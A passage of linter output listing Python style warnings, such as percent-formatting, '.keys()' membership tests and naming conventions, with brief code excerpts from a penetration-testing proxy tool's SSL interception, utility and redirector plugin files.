    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
125 |                     )
126 |                     self.logger.dbg(
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\sslintercept.py:127:25
    |
125 |                     )
126 |                     self.logger.dbg(
127 |                         "Creating CA key file: '%s'" % self.options["cakey"]
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
128 |                     )
129 |                     p = Popen(
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\sslintercept.py:172:37
    |
170 |                 absfile = os.path.abspath(file)
171 |                 if absfile in self.dontRemove:
172 |                     self.logger.dbg('SSL file not cleaned: "{}"'.format(absfile))
    |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
173 |                     continue
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\sslintercept.py:175:33
    |
173 |                     continue
174 |
175 |                 self.logger.dbg("Removing old certificate: {}".format(absfile))
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
176 |                 os.remove(absfile)
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\sslintercept.py:182:17
    |
180 |         except Exception as e:
181 |             self.logger.err(
182 |                 "Couldn't perform SSL interception files cleaning: '%s'" % e
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
183 |             )
    |
help: Replace with format specifiers

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\web\proxy2\lib\utils.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 | #
  |
help: Remove unnecessary coding comment

F841 Local variable `s` is assigned to but never used
  --> security\penetration-testing-tools\web\proxy2\lib\utils.py:15:5
   |
14 | def hexdump(data):
15 |     s = ""
   |     ^
16 |     n = 0
17 |     lines = []
   |
help: Remove assignment to unused variable `s`

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\utils.py:27:17
   |
25 |     for i in range(0, len(data), 16):
26 |         line = ""
27 |         line += "%04x | " % (i)
   |                 ^^^^^^^^^^^^^^^
28 |         n += 16
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\utils.py:44:21
   |
42 |                 break
43 |             c = data[j] if not (data[j] < 0x20 or data[j] > 0x7E) else "."
44 |             line += "%c" % c
   |                     ^^^^
45 |
46 |         line = line.ljust(74, " ") + " |"
   |
help: Replace with format specifiers

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\web\proxy2\lib\utils.py:80:13
   |
79 |           if (
80 | /             plugins.IProxyPlugin.proxy2_metadata_headers[
81 | |                 "strip_headers_during_forward"
82 | |             ].lower()
83 | |             in headers2.keys()
   | |______________________________^
84 |           ):
85 |               strips = headers2[
   |
help: Remove `.keys()`

B007 Loop control variable `k` not used within loop body
  --> security\penetration-testing-tools\web\proxy2\lib\utils.py:97:13
   |
95 |             )
96 |
97 |         for k, v in plugins.IProxyPlugin.proxy2_metadata_headers.items():
   |             ^
98 |             if v.lower() in headers2.keys():
99 |                 strip_these_headers.append(v)
   |
help: Rename unused `k` to `_k`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\web\proxy2\lib\utils.py:98:16
   |
97 |         for k, v in plugins.IProxyPlugin.proxy2_metadata_headers.items():
98 |             if v.lower() in headers2.keys():
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
99 |                 strip_these_headers.append(v)
   |
help: Remove `.keys()`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\utils.py:107:35
    |
105 |                         headers[h2] = drop_this_header
106 |
107 |                 if len(h) > 0 and h.lower() not in headers2.keys():
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
108 |                     headers[h] = drop_this_header
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\utils.py:126:24
    |
124 |             if v == drop_this_header:
125 |                 continue
126 |             reqhdrs += "\t{}: {}\r\n".format(k, v)
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
127 |
128 |         b = body
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\lib\utils.py:129:17
    |
128 |         b = body
129 |         if b != None and type(b) == bytes:
    |                 ^^^^
130 |             b = body.decode(errors="ignore")
    |
help: Replace with `cond is not None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\utils.py:129:26
    |
128 |         b = body
129 |         if b != None and type(b) == bytes:
    |                          ^^^^^^^^^^^^^^^^
130 |             b = body.decode(errors="ignore")
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\utils.py:136:20
    |
134 |         )
135 |
136 |         logger.dbg("SENDING REVERSE-PROXY REQUEST to [{}]:\n\n{}".format(host, request))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
137 |         return method(self, _method, url, body, headers3, encode_chunked)
    |
help: Convert to f-string

B010 [*] Do not call `setattr` with a constant attribute value. It is not any safer than normal property access.
   --> security\penetration-testing-tools\web\proxy2\lib\utils.py:146:5
    |
144 |       logger = log
145 |
146 | /     setattr(
147 | |         http.client.HTTPConnection,
148 | |         "putheader",
149 | |         putheader_decorator(http.client.HTTPConnection.putheader),
150 | |     )
    | |_____^
151 |       setattr(
152 |           http.client.HTTPConnection,
    |
help: Replace `setattr` with assignment

B010 [*] Do not call `setattr` with a constant attribute value. It is not any safer than normal property access.
   --> security\penetration-testing-tools\web\proxy2\lib\utils.py:151:5
    |
149 |           putheader_decorator(http.client.HTTPConnection.putheader),
150 |       )
151 | /     setattr(
152 | |         http.client.HTTPConnection,
153 | |         "_send_request",
154 | |         send_request_decorator(http.client.HTTPConnection._send_request),
155 | |     )
    | |_____^
    |
help: Replace `setattr` with assignment

N999 Invalid module name: 'IProxyPlugin'
--> security\penetration-testing-tools\web\proxy2\plugins\IProxyPlugin.py:1:1

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\web\proxy2\plugins\IProxyPlugin.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 |
4 | from abc import ABC, abstractmethod
  |
help: Remove unnecessary coding comment

N818 Exception name `DropConnectionException` should be named with an Error suffix
  --> security\penetration-testing-tools\web\proxy2\plugins\IProxyPlugin.py:18:7
   |
18 | class DropConnectionException(Exception):
   |       ^^^^^^^^^^^^^^^^^^^^^^^
19 |     def __init__(self, txt):
20 |         super().__init__("DropConnectionException: " + txt)
   |

N818 Exception name `DontFetchResponseException` should be named with an Error suffix
  --> security\penetration-testing-tools\web\proxy2\plugins\IProxyPlugin.py:23:7
   |
23 | class DontFetchResponseException(Exception):
   |       ^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |     def __init__(self, txt):
25 |         super().__init__("DontFetchResponseException: " + txt)
   |

N803 Argument name `proxyOptions` should be lowercase
  --> security\penetration-testing-tools\web\proxy2\plugins\IProxyPlugin.py:29:32
   |
28 | class IProxyPlugin(ABC):
29 |     def __init__(self, logger, proxyOptions):
   |                                ^^^^^^^^^^^^
30 |         super().__init__()
   |

N803 Argument name `proxyOptions` should be lowercase
  --> security\penetration-testing-tools\web\proxy2\plugins\dummy.py:10:32
   |
 9 | class ProxyPlugin(IProxyPlugin):
10 |     def __init__(self, logger, proxyOptions):
   |                                ^^^^^^^^^^^^
11 |         self.logger = logger
12 |         self.proxyOptions = proxyOptions
   |

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\plugins\dummy.py:25:13
   |
23 |       def request_handler(self, req, req_body):
24 |           self.logger.info(
25 | /             'hello world from request_handler! Message: "%s", Req: "%s"'
26 | |             % (self.proxyOptions["hello"], req.path)
   | |____________________________________________________^
27 |           )
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\plugins\dummy.py:31:13
   |
29 |       def response_handler(self, req, req_body, res, res_body):
30 |           self.logger.info(
31 | /             'hello world from response_handler! Message: "%s", Req: "%s"'
32 | |             % (self.proxyOptions["hello"], req.path)
   | |____________________________________________________^
33 |           )
   |
help: Replace with format specifiers

F401 [*] `pprint` imported but unused
  --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:71:8
   |
69 | import os
70 | import os.path
71 | import pprint
   |        ^^^^^^
72 | import random
73 | import re
   |
help: Remove unused import: `pprint`

F401 [*] `sys` imported but unused
  --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:75:8
   |
73 | import re
74 | import socket
75 | import sys
   |        ^^^
76 | from datetime import datetime
77 | from urllib.parse import parse_qs, parse_qsl, urlparse, urlsplit
   |
help: Remove unused import: `sys`

F401 [*] `urllib.parse.parse_qsl` imported but unused
  --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:77:36
   |
75 | import sys
76 | from datetime import datetime
77 | from urllib.parse import parse_qs, parse_qsl, urlparse, urlsplit
   |                                    ^^^^^^^^^
78 |
79 | import requests
   |
help: Remove unused import: `urllib.parse.parse_qsl`

F401 [*] `requests` imported but unused
  --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:79:8
   |
77 | from urllib.parse import parse_qs, parse_qsl, urlparse, urlsplit
78 |
79 | import requests
   |        ^^^^^^^^
80 | import yaml
81 | from IProxyPlugin import *
   |
help: Remove unused import: `requests`

F403 `from IProxyPlugin import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:81:1
   |
79 | import requests
80 | import yaml
81 | from IProxyPlugin import *
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^
82 | from lib.ipLookupHelper import IPGeolocationDeterminant, IPLookupHelper
83 | from sqlitedict import SqliteDict
   |

N816 Variable `alreadyPrintedPeers` in global scope should not be mixedCase
  --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:87:1
   |
85 | BANNED_AGENTS = []
86 | OVERRIDE_BANNED_AGENTS = []
87 | alreadyPrintedPeers = set()
   | ^^^^^^^^^^^^^^^^^^^
   |

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:134:29
    |
132 |     def parse(self, path):
133 |         try:
134 |             with open(path, "r") as f:
    |                             ^^^
135 |                 self.data = f.read().replace("\r\n", "\n")
136 |                 self.datalines = self.data.split("\n")
    |
help: Remove mode argument

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:138:37
    |
136 |                 self.datalines = self.data.split("\n")
137 |
138 |         except FileNotFoundError as e:
    |                                     ^
139 |             self.logger.fatal(
140 |                 "Malleable profile specified in redirector's config file (profile) doesn't exist: ({})".format(
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:140:17
    |
138 |           except FileNotFoundError as e:
139 |               self.logger.fatal(
140 | /                 "Malleable profile specified in redirector's config file (profile) doesn't exist: ({})".format(
141 | |                     path
142 | |                 )
    | |_________________^
143 |               )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:171:42
    |
169 |               line = self.datalines[linenum]
170 |
171 |               assert len(dynkey) == depth, "Depth ({}) and dynkey differ ({})".format(
    |  __________________________________________^
172 | |                 depth, dynkey
173 | |             )
    | |_____________^
174 |
175 |               if line.strip() == "":
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:187:21
    |
185 |               if len(line) > 100:
186 |                   self.logger.dbg(
187 | /                     "[key: {}, line: {}, pos: {}] {}...{}".format(
188 | |                         str(dynkey), linenum, pos, line[:50], line[-50:]
189 | |                     )
    | |_____________________^
190 |                   )
191 |               else:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:193:21
    |
191 |               else:
192 |                   self.logger.dbg(
193 | /                     "[key: {}, line: {}, pos: {}] {}".format(
194 | |                         str(dynkey), linenum, pos, line[:100]
195 | |                     )
    | |_____________________^
196 |                   )
    |
help: Convert to f-string

SIM108 Use ternary operator `parsed = parsed[sect][variant] if len(variant) > 0 else parsed[sect]` instead of `if`-`else`-block
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:201:17
    |
199 |               for key in dynkey:
200 |                   sect, variant = key
201 | /                 if len(variant) > 0:
202 | |                     parsed = parsed[sect][variant]
203 | |                 else:
204 | |                     parsed = parsed[sect]
    | |_________________________________________^
205 |
206 |               matched = False
    |
help: Replace `if`-`else`-block with `parsed = parsed[sect][variant] if len(variant) > 0 else parsed[sect]`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:216:25
    |
214 |             n = compregexes["begin-section-and-variant"].match(twolines)
215 |             if m or n:
216 |                 if m == None and n != None:
    |                         ^^^^
217 |                     self.logger.dbg(
218 |                         'Section opened in a new line: [{}] = ["{}"]'.format(
    |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:216:39
    |
214 |             n = compregexes["begin-section-and-variant"].match(twolines)
215 |             if m or n:
216 |                 if m == None and n != None:
    |                                       ^^^^
217 |                     self.logger.dbg(
218 |                         'Section opened in a new line: [{}] = ["{}"]'.format(
    |
help: Replace with `cond is not None`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:231:20
    |
229 |                 variant = ""
230 |
231 |                 if section not in parsed.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
232 |                     parsed[section] = {}
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:251:21
    |
250 |                 self.logger.dbg(
251 |                     "Extracted section: [{}] (variant: {})".format(section, variant)
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
252 |                 )
    |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:267:20
    |
265 |                 variant = ""
266 |
267 |                 if sect in parsed.keys() and "variant" in parsed[sect][variant].keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^
268 |                     variant = "(variant: {})".format(variant)
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:267:46
    |
265 |                 variant = ""
266 |
267 |                 if sect in parsed.keys() and "variant" in parsed[sect][variant].keys():
    |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
268 |                     variant = "(variant: {})".format(variant)
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:268:31
    |
267 |                 if sect in parsed.keys() and "variant" in parsed[sect][variant].keys():
268 |                     variant = "(variant: {})".format(variant)
    |                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
269 |
270 |                 self.logger.dbg("Reached end of section {}.{}".format(sect, variant))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:270:33
    |
268 |                     variant = "(variant: {})".format(variant)
269 |
270 |                 self.logger.dbg("Reached end of section {}.{}".format(sect, variant))
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
271 |                 pos += len(line)
272 |                 linenum += 1
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:277:48
    |
275 |             m = compregexes["set-name-value"].match(line)
276 |             if m:
277 |                 n = list(filter(lambda x: x != None, m.groups()[2:]))[0]
    |                                                ^^^^
278 |
279 |                 val = n.replace("\\\\", "\\")
    |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:297:25
    |
295 |                     parsed[param] = val
296 |                     self.logger.dbg(
297 |                         "Extracted variable: [{}] = [{}]".format(param, val)
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
298 |                     )
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:308:56
    |
306 |             m = compregexes["set-parameter-value"].search(line)
307 |             if m:
308 |                 paramname = list(filter(lambda x: x != None, m.groups()))[0]
    |                                                        ^^^^
309 |                 restofline = line[line.find(paramname) + len(paramname) :]
310 |                 values = []
    |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:313:25
    |
312 |                 n = compregexes["prepend-append-value"].search(line)
313 |                 if n != None and len(n.groups()) > 1:
    |                         ^^^^
314 |                     paramname = n.groups()[0]
315 |                     paramval = n.groups()[1].replace("\\\\", "\\")
    |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:318:25
    |
316 |                     values.append(paramval)
317 |                     self.logger.dbg(
318 |                         'Extracted {} value: "{}..."'.format(paramname, paramval[:20])
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
319 |                     )
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:323:63
    |
321 |                 else:
322 |                     for n in compregexes["parameter-value"].finditer(restofline):
323 |                         paramval = list(filter(lambda x: x != None, n.groups()[1:]))[0]
    |                                                               ^^^^
324 |                         values.append(paramval.replace("\\\\", "\\"))
    |
help: Replace with `cond is not None`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:331:20
    |
329 |                     values = values[0]
330 |
331 |                 if paramname in parsed.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^
332 |                     if type(parsed[paramname]) == list:
333 |                         parsed[paramname].append(values)
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:332:24
    |
331 |                 if paramname in parsed.keys():
332 |                     if type(parsed[paramname]) == list:
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
333 |                         parsed[paramname].append(values)
334 |                     else:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:337:24
    |
335 |                         parsed[paramname] = [parsed[paramname], values]
336 |                 else:
337 |                     if type(values) == list:
    |                        ^^^^^^^^^^^^^^^^^^^^
338 |                         parsed[paramname] = [
339 |                             values,
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:345:21
    |
344 |                   self.logger.dbg(
345 | /                     "Extracted complex variable: [{}] = [{}]".format(
346 | |                         paramname, str(values)[:100]
347 | |                     )
    | |_____________________^
348 |                   )
    |
help: Convert to f-string

F841 Local variable `matched` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:350:17
    |
348 |                 )
349 |
350 |                 matched = "complexset"
    |                 ^^^^^^^
351 |                 pos += len(line)
352 |                 linenum += 1
    |
help: Remove assignment to unused variable `matched`

B007 Loop control variable `v` not used within loop body
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:379:16
    |
378 |     def normalize(self):
379 |         for k, v in self.config.items():
    |                ^
380 |             if k in MalleableParser.ProtocolTransactions:
381 |                 if k == "http-get" and "verb" not in self.config[k].keys():
    |
help: Rename unused `v` to `_v`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:381:40
    |
379 |         for k, v in self.config.items():
380 |             if k in MalleableParser.ProtocolTransactions:
381 |                 if k == "http-get" and "verb" not in self.config[k].keys():
    |                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
382 |                     self.config[k]["verb"] = "GET"
383 |                 elif k == "http-post" and "verb" not in self.config[k].keys():
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:383:43
    |
381 |                 if k == "http-get" and "verb" not in self.config[k].keys():
382 |                     self.config[k]["verb"] = "GET"
383 |                 elif k == "http-post" and "verb" not in self.config[k].keys():
    |                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
384 |                     self.config[k]["verb"] = "POST"
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:393:28
    |
391 |                         }
392 |                     else:
393 |                         if "header" not in self.config[k][a].keys():
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
394 |                             self.config[k][a]["header"] = []
395 |                         if "variant" not in self.config[k][a].keys():
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:395:28
    |
393 |                         if "header" not in self.config[k][a].keys():
394 |                             self.config[k][a]["header"] = []
395 |                         if "variant" not in self.config[k][a].keys():
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
396 |                             self.config[k][a]["variant"] = "default"
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:399:16
    |
398 |         for k, v in MalleableParser.GlobalOptionsDefaults.items():
399 |             if k.lower() not in self.config.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
400 |                 self.config[k] = v
401 |                 self.logger.dbg(
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:402:21
    |
400 |                   self.config[k] = v
401 |                   self.logger.dbg(
402 | /                     'MalleableParser: Global variable ({}) not defined. Setting default value of: "{}"'.format(
403 | |                         k, v
404 | |                     )
    | |_____________________^
405 |                   )
    |
help: Convert to f-string

F405 `IProxyPlugin` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:408:19
    |
408 | class ProxyPlugin(IProxyPlugin):
    |                   ^^^^^^^^^^^^
409 |     class AlterHostHeader(Exception):
410 |         pass
    |

N818 Exception name `AlterHostHeader` should be named with an Error suffix
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:409:11
    |
408 | class ProxyPlugin(IProxyPlugin):
409 |     class AlterHostHeader(Exception):
    |           ^^^^^^^^^^^^^^^
410 |         pass
    |

N803 Argument name `proxyOptions` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:460:32
    |
458 |     }
459 |
460 |     def __init__(self, logger, proxyOptions):
    |                                ^^^^^^^^^^^^
461 |         self.is_request = False
462 |         self.logger = logger
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:472:16
    |
471 |         for k, v in ProxyPlugin.DefaultRedirectorConfig.items():
472 |             if k not in self.proxyOptions.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
473 |                 self.proxyOptions[k] = v
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:486:16
    |
484 |         self.logger.err(text, color="magenta")
485 |         if not self.proxyOptions["report_only"]:
486 |             if "X-Drop-Reason" in self.addToResHeaders.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
487 |                 self.addToResHeaders["X-Drop-Reason"] += "; " + text
488 |             else:
    |
help: Remove `.keys()`

N806 Variable `parametersRequiringDirectPath` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:495:9
    |
493 |         global OVERRIDE_BANNED_AGENTS
494 |
495 |         parametersRequiringDirectPath = (
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
496 |             "ip_addresses_blacklist_file",
497 |             "banned_agents_words_file",
    |

N806 Variable `proxy2BasePath` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:503:9
    |
501 |         )
502 |
503 |         proxy2BasePath = os.path.abspath(
    |         ^^^^^^^^^^^^^^
504 |             os.path.join(os.path.dirname(os.path.realpath(__file__)), "..")
505 |         )
    |

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:507:22
    |
505 |         )
506 |
507 |         if parser != None:
    |                      ^^^^
508 |             parser.add_argument(
509 |                 "--redir-config",
    |
help: Replace with `cond is not None`

N806 Variable `redirectorConfig` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:524:13
    |
522 |                 )
523 |
524 |             redirectorConfig = {}
    |             ^^^^^^^^^^^^^^^^
525 |             configBasePath = ""
526 |             try:
    |

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:525:13
    |
524 |             redirectorConfig = {}
525 |             configBasePath = ""
    |             ^^^^^^^^^^^^^^
526 |             try:
527 |                 if (
    |

N806 Variable `redirectorConfig` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:533:25
    |
531 |                     with open(self.proxyOptions["redir_config"]) as f:
532 |                         # redirectorConfig = yaml.load(f, Loader=yaml.FullLoader)
533 |                         redirectorConfig = yaml.load(f)
    |                         ^^^^^^^^^^^^^^^^
534 |
535 |                     self.proxyOptions.update(redirectorConfig)
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:538:28
    |
537 |                     for k, v in ProxyPlugin.DefaultRedirectorConfig.items():
538 |                         if k not in self.proxyOptions.keys():
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
539 |                             self.proxyOptions[k] = v
    |
help: Remove `.keys()`

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:543:25
    |
541 |                     p = os.path.join(proxy2BasePath, self.proxyOptions["redir_config"])
542 |                     if os.path.isfile(p) or os.path.isdir(p):
543 |                         configBasePath = p
    |                         ^^^^^^^^^^^^^^
544 |                     else:
545 |                         configBasePath = os.path.dirname(
    |

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:545:25
    |
543 |                         configBasePath = p
544 |                     else:
545 |                         configBasePath = os.path.dirname(
    |                         ^^^^^^^^^^^^^^
546 |                             os.path.abspath(self.proxyOptions["redir_config"])
547 |                         )
    |

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:551:25
    |
549 |                     p = os.path.join(proxy2BasePath, self.proxyOptions["config"])
550 |                     if os.path.isfile(p) or os.path.isdir(p):
551 |                         configBasePath = p
    |                         ^^^^^^^^^^^^^^
552 |                     else:
553 |                         configBasePath = os.path.dirname(
    |

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:553:25
    |
551 |                         configBasePath = p
552 |                     else:
553 |                         configBasePath = os.path.dirname(
    |                         ^^^^^^^^^^^^^^
554 |                             os.path.abspath(self.proxyOptions["config"])
555 |                         )
    |

N806 Variable `paramName` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:564:21
    |
562 |                 )
563 |
564 |                 for paramName in parametersRequiringDirectPath:
    |                     ^^^^^^^^^
565 |                     if (
566 |                         paramName in self.proxyOptions.keys()
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:566:25
    |
564 |                 for paramName in parametersRequiringDirectPath:
565 |                     if (
566 |                         paramName in self.proxyOptions.keys()
